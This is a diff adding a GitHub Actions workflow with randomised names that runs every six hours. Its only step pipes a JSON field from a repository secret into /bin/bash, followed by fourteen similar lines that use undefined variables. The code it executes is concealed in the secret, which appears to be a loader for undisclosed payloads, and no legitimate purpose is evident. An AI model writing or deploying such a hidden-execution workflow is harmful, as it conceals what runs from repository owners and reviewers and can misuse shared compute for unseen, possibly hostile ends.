@@ -1,0 +1,32 @@
+name: xianghuaguo3451
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          ltmot54845: ${{ secrets.ltmot54845 }}
+        run: |
+          echo $ltmot54845 | jq -r .rxwk1 | /bin/bash
+          echo $odlzv326 | jq -r .qtbc773 | /bin/bash
+          echo $u1460 | jq -r .ov9959 | /bin/bash
+          echo $oyt48 | jq -r .j8 | /bin/bash
+          echo $pqe308 | jq -r .r86 | /bin/bash
+          echo $usx36967 | jq -r .gwj5929 | /bin/bash
+          echo $ivf8845 | jq -r .n65 | /bin/bash
+          echo $v83242 | jq -r .rqbd1 | /bin/bash
+          echo $b02 | jq -r .ekpht6876 | /bin/bash
+          echo $dt31 | jq -r .gjeeo1 | /bin/bash
+          echo $h9 | jq -r .bim3 | /bin/bash
+          echo $iisc5295 | jq -r .rmec486 | /bin/bash
+          echo $mpbna959 | jq -r .l450 | /bin/bash
+          echo $jubm88 | jq -r .daaqk81750 | /bin/bash
+          echo $vdu23937 | jq -r .zfotr6115 | /bin/bash
+
